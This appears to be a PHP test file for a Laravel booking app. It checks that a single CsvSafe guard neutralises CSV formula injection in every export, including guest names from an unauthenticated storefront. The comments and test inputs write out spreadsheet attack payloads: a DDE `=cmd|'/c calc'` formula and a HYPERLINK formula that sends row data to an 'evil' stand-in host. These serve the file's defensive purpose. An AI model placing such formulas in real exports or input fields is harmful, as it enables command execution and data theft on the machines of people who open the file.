<?php

use App\Support\Export\CsvSafe;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

/*
 * CSV FORMULA INJECTION — THE ONE GUARD MUST COVER EVERY EXPORT (audit 2026-08-07 · L1-02 + F-2b-05).
 *
 * CsvSafe declares itself "The ONE CSV formula-injection guard for every operator export (anti-drift — two
 * copies WILL drift)". It was imported by 2 of 12 emitters. Three controllers carried byte-identical PRIVATE
 * copies of it, and ALL SEVEN owner-realm exports sanitised NOTHING.
 *
 * ⚠️ AND THE INPUT IS UNAUTHENTICATED. The public storefront validates a guest name as
 * ['required','string','max:120'] with no character restriction. That name is stored raw and flows, name-only
 * (#28), straight into the owner Bookings export. So an anonymous visitor could plant a formula in a CSV an
 * owner later opens in Excel — `=cmd|'/c calc'!A1`, or a `=HYPERLINK` that exfiltrates the row.
 *
 * Every fputcsv row in the app now goes through CsvSafe::row(). This file pins that: the guard itself, the
 * end-to-end owner path, and the "no private copies" rule that started it.
 */

/**
 * EVERY PHP file under app/ — a RecursiveIteratorIterator, deliberately not glob('**\/*.php').
 *
 * ⚠️ glob's `**` matches exactly one directory level, not zero-or-more: it found 102 of 118 controller files
 * and silently MISSED the 16 sitting directly in app/Http/Controllers/. A guard test that scans 86% of the
 * tree and reports success is worse than no test. Measured before switching.
 *
 * @return list<string>
 */
function everyAppPhpFile(): array
{
    $files = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(app_path()));

    foreach ($iterator as $file) {
        if ($file->isFile() && $file->getExtension() === 'php') {
            $files[] = $file->getPathname();
        }
    }

    return $files;
}

it('neutralises every formula prefix, and leaves ordinary text alone', function () {
    foreach (['=cmd|\'/c calc\'!A1', '+1+1', '-1+1', '@SUM(A1)', "\tTabbed"] as $dangerous) {
        expect(CsvSafe::field($dangerous))->toStartWith("'");
    }

    // Ordinary values must pass through untouched — over-escaping would corrupt real data.
    foreach (['Ada Lovelace', 'R-ABC123', '245.00', 'Seaside · A1'] as $safe) {
        expect(CsvSafe::field($safe))->toBe($safe);
    }

    // CR/LF are stripped so a single field cannot forge extra rows.
    expect(CsvSafe::field("line1\r\nline2"))->not->toContain("\n");
});

it('sanitises a whole row, including non-string cells', function () {
    $row = CsvSafe::row(['=HYPERLINK("http://evil","click")', 'Ada', 42, 3.5, null]);

    expect($row[0])->toStartWith("'");
    expect($row[1])->toBe('Ada');
    // Numbers/nulls survive as their string form — they can never match a formula prefix.
    expect($row[2])->toBe('42');
    expect($row[3])->toBe('3.5');
    expect($row[4])->toBe('');
});

it('neutralises a dangerous GUEST NAME in the owner bookings export — the unauthenticated path', function () {
    $s = seedScenario(1);
    $owner = ownerRoleUser($s);

    // Exactly what the storefront's `['required','string','max:120']` permits an anonymous visitor to submit.
    $payload = '=HYPERLINK("http://evil.test?d="&A1,"Click")';
    $s['guest']->update(['first_name' => $payload, 'last_name' => 'Exfil']);

    book($s, ['unit_id' => $s['units'][0]->id]);

    $csv = $this->actingAs($owner)->get('/owner/bookings/export')->streamedContent();

    // The payload appears (it IS the guest's name — the export is correct to show it)…
    expect($csv)->toContain('HYPERLINK');
    // …but NEVER as a live formula: quote-prefixed, so Excel/Sheets treat it as literal text.
    expect($csv)->not->toContain(',='.'HYPERLINK');
    expect($csv)->toContain("'=".'HYPERLINK');
});

it('keeps ONE guard — no controller may carry a private copy', function () {
    // The anti-drift rule the class states about itself, now enforced. Three controllers had byte-identical
    // re-implementations; a fourth would have been just as easy to add.
    $copies = [];

    foreach (everyAppPhpFile() as $file) {
        if (str_contains((string) file_get_contents($file), 'private function csvSafe')) {
            $copies[] = basename($file);
        }
    }

    expect($copies)->toBe([]);
});

it('routes EVERY export through the one guard', function () {
    // Any new fputcsv that forgets CsvSafe::row fails here — the check that would have caught the original
    // seven-owner-export gap.
    $unwrapped = [];

    foreach (everyAppPhpFile() as $file) {
        foreach (explode("\n", (string) file_get_contents($file)) as $n => $line) {
            if (str_contains($line, 'fputcsv(') && ! str_contains($line, 'CsvSafe::row(')) {
                $unwrapped[] = basename($file).':'.($n + 1);
            }
        }
    }

    expect($unwrapped)->toBe([]);
});
